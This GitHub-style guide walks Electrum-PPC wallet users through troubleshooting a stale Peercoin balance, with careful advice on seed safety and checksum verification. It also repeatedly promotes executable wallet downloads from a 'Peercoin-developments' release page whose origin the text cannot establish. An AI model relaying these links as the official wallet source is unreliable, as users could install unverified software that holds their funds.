<p align="center"><img src="https://github.com/Peercoin-developments/learn/raw/HEAD/assets/banner-article.png" alt="Electrum-PPC guides" width="100%"></p>

<h1 align="center">Fix a Stale Balance in Electrum-PPC</h1>

<p align="center">An Electrum-PPC how-to guide for the desktop Peercoin wallet.</p>

<p align="center">
  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-6FD579?style=for-the-badge&logo=windows&logoColor=050B16&labelColor=050B16" alt="Download Electrum-PPC for Windows"></a>
  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-6FD579?style=for-the-badge&logo=apple&logoColor=050B16&labelColor=050B16" alt="Download Electrum-PPC for macOS"></a>
  <a href="https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-6FD579?style=for-the-badge&logo=linux&logoColor=050B16&labelColor=050B16" alt="Download Electrum-PPC for Linux"></a>
</p>

| Platform | File |
|---|---|
| 🪟 Windows | [`electrum-ppc-wallet-v0.16.0.exe`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.exe) |
| 🍎 macOS | [`electrum-ppc-wallet-v0.16.0.dmg`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.dmg) |
| 🐧 Linux | [`electrum-ppc-wallet-v0.16.0.zip`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.zip) |

All versions and checksums are on the [Electrum-PPC v0.16.0 release page](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/tag/v0.16.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

**Short answer:** Treat a stale Electrum-PPC balance as a display or connection troubleshooting problem first: protect your recovery information, check which wallet and transaction you are examining, review any available connection information, and restart normally before considering software changes. Do not restore from seed merely because the display is stale.

## 🔎 You'll see this if

- You expect an incoming PPC payment, but the displayed balance has not changed.
- You sent PPC and are unsure whether the balance reflects that transaction.
- Two observations disagree: for example, someone says they sent a payment, but your wallet does not show the expected amount.
- The balance appears unchanged after reopening the wallet or reconnecting your computer.
- You are considering restoring or reinstalling because you cannot tell whether the problem concerns the wallet display or the payment itself.

These symptoms are starting points, not proof that funds are missing. The aim is to separate an expectation about a payment from evidence about that payment and what your wallet currently displays.

---

## 🧭 Why it happens

Electrum-PPC is a desktop Peercoin wallet for Windows, macOS and Linux. It is intended for lightweight access and does not need to download the full Peercoin chain locally, unlike Peercoin Core, a full node. Downloading a full chain is therefore not a prerequisite for this troubleshooting process.

As general wallet troubleshooting guidance, investigate three possibilities separately: the application has not obtained current information, you are viewing a different wallet than intended, or the expected transaction needs further checking. These are possibilities to test, not confirmed explanations for your particular case.

For example, “the sender pressed send” and “I have a transaction reference matching my receiving address” are different observations. Likewise, an unchanged total alone does not establish whether a particular transaction is absent, pending, or already reflected in the amount shown.

Avoid guessing from a single number. Build a small record of what you expected, what the application shows, and what evidence you have.

---

## 🛠️ Fix it step by step

1. **Protect recovery information before making changes.**

   Recovery comes first: write your seed phrase on paper, offline. If you already have a paper backup, keep it offline rather than typing it into another application to “check” it. Do not delete or replace wallet files as a display troubleshooting step.

   If you are unsure about your recovery preparation, read the [Electrum-PPC backup and restore guidance](https://github.com/Peercoin-developments/learn/blob/main/how-to/electrum-ppc-backup-and-restore.md) before attempting changes beyond ordinary observation and restarting.

   > [!WARNING]
   > Nobody legitimate will ever ask for your seed phrase, private keys, wallet file, remote access, or a payment to “unlock,” “verify,” or “sync” a wallet. Do not enter recovery information into a website offered as a balance repair tool.

2. **Write down the discrepancy without recording secrets.**

   Note the displayed balance, the amount you expected, whether the payment was incoming or outgoing, and any transaction reference you already have. Record any visible error wording exactly, but exclude sensitive information.

   For example: “Expected an incoming 2 PPC payment; displayed balance unchanged; sender supplied a transaction reference.” This is more useful than “wallet broken.” Do not calculate an assumed final balance from an outgoing payment without also considering any transaction details your version actually shows.

3. **Check that you are examining the intended wallet.**

   As general guidance, if you use more than one wallet, compare the currently open wallet with your own records. Use whatever identifying information your version provides; do not assume a particular menu, filename, or storage location.

   For an incoming payment, compare the address you originally supplied with the destination reported for that payment, where available. Compare the complete address, not just its beginning or ending. Do not create a new receiving request or send another payment merely to make the balance change.

4. **Separate transaction evidence from the balance display.**

   If your version provides a transaction list or transaction details, look for the payment in question. Note whether it appears and copy any status wording into your troubleshooting notes. Avoid translating an unfamiliar label into a conclusion.

   For an incoming payment, ask the sender for a transaction reference and the destination they used—not a wallet screenshot containing unrelated personal information. For an outgoing payment, do not send it again simply because the total looks unchanged. Consult the [Electrum-PPC pending transaction guide](https://github.com/Peercoin-developments/learn/blob/main/how-to/pending-transaction-in-electrum-ppc.md) if the transaction itself remains unresolved.

5. **Review connectivity without weakening security.**

   Check whether the computer has ordinary internet access. If Electrum-PPC exposes connection or network information in your version, record what it says. General internet access is only one check; do not treat it as proof that the wallet has current information.

   As general troubleshooting guidance, note whether the issue began after a network, firewall, or VPN change. Do not disable security protections wholesale or enter server details supplied by an unsolicited message. Use the [Electrum-PPC server connection troubleshooting article](https://github.com/Peercoin-developments/learn/blob/main/how-to/server-connection-problems-electrum-ppc.md) to structure further checks.

6. **Close normally, reopen, and compare observations.**

   Once no send action or other wallet operation is in progress, close the application normally and reopen the intended wallet. Review the same balance, transaction, and connection observations again. This is a general troubleshooting step, not a guaranteed repair.

   Change one thing at a time. If you restart, switch networks, and replace software together, you lose the ability to identify which change affected the result. For broader symptoms, follow the [Electrum-PPC not syncing checklist](https://github.com/Peercoin-developments/learn/blob/main/how-to/electrum-ppc-not-syncing.md).

7. **Verify any replacement download before using it.**

   If you decide to replace the application, use the [Electrum-PPC v0.16.0 release page](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/tag/v0.16.0). It provides Windows `.exe`, macOS `.dmg`, and Linux `.zip` packages, plus SHA-256 checksums.

   Compare the downloaded file’s SHA-256 with the corresponding release checksum. Use `Get-FileHash -Algorithm SHA256` on Windows, `shasum -a 256` on macOS, or `sha256sum` on Linux, supplying the downloaded filename. Follow the [Electrum-PPC download checksum verification guide](https://github.com/Peercoin-developments/learn/blob/main/how-to/verify-electrum-ppc-download-checksum.md) if needed. Do not assume replacing software will fix the discrepancy.

---

## 🔁 If that did not work

Prepare a minimal troubleshooting summary: operating system, application version if available, incoming or outgoing payment, exact error wording, and the checks already completed. Explain whether the transaction is missing from the available history or only the total seems wrong.

When seeking help, start without addresses, transaction references, screenshots, or identifying balances. Share only what is necessary after considering privacy. Never share recovery secrets or wallet files.

Do not restore from seed merely because the display remains stale. If you independently decide to move to a new wallet, that means creating a new wallet and sending the funds to it—not restoring the same seed as a display repair.

---

## 🛡️ Prevention

Keep your paper seed backup offline and maintain non-secret notes that distinguish your wallets. Record payment references when available so you can investigate a specific transaction rather than relying on memory.

> [!TIP]
> Keep a short troubleshooting log: observation, single change, result. “Reopened the same wallet; transaction still absent” is more actionable than repeatedly reinstalling.

Verify downloads before using them. Avoid duplicate sends during uncertainty, and keep recovery work separate from ordinary display troubleshooting.

---

## ❓ FAQ

<details>
<summary>Does a stale balance mean my PPC is lost?</summary>

An unchanged display alone is not enough to reach that conclusion. Check the intended wallet, available transaction evidence, and connection information before deciding what happened.

</details>

<details>
<summary>Should I restore my seed to refresh the balance?</summary>

No. Do not restore from seed merely because a display is stale. Keep the seed offline and investigate the discrepancy without introducing recovery information into another application or website.

</details>

<details>
<summary>Must I download the full Peercoin chain?</summary>

No. Electrum-PPC is intended as lightweight access and does not need the full Peercoin chain downloaded locally. Peercoin Core is a full node; its operating model is different.

</details>

<details>
<summary>Should I send the payment again?</summary>

Not merely because the balance looks unchanged. First investigate the original payment using whatever transaction information is available. Treat resending as a separate financial decision, not a display troubleshooting technique.

</details>

---

## ⬇️ Download Electrum-PPC

| Platform | File |
|---|---|
| 🪟 Windows | [`electrum-ppc-wallet-v0.16.0.exe`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.exe) |
| 🍎 macOS | [`electrum-ppc-wallet-v0.16.0.dmg`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.dmg) |
| 🐧 Linux | [`electrum-ppc-wallet-v0.16.0.zip`](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/download/v0.16.0/electrum-ppc-wallet-v0.16.0.zip) |

Checksums for every file are on the [Electrum-PPC v0.16.0 release page](https://github.com/Peercoin-developments/electrum-ppc-desktop-wallet/releases/tag/v0.16.0).

---

## 🔗 Related articles

| Guide |
|---|
| [Electrum-PPC Not Syncing](https://github.com/Peercoin-developments/learn/blob/main/how-to/electrum-ppc-not-syncing.md) |
| [Server Connection Problems in Electrum-PPC](https://github.com/Peercoin-developments/learn/blob/main/how-to/server-connection-problems-electrum-ppc.md) |
| [Pending Transaction in Electrum-PPC](https://github.com/Peercoin-developments/learn/blob/main/how-to/pending-transaction-in-electrum-ppc.md) |
| [Electrum-PPC Backup and Restore](https://github.com/Peercoin-developments/learn/blob/main/how-to/electrum-ppc-backup-and-restore.md) |

[Back to the Electrum-PPC learn hub](https://github.com/Peercoin-developments/learn)
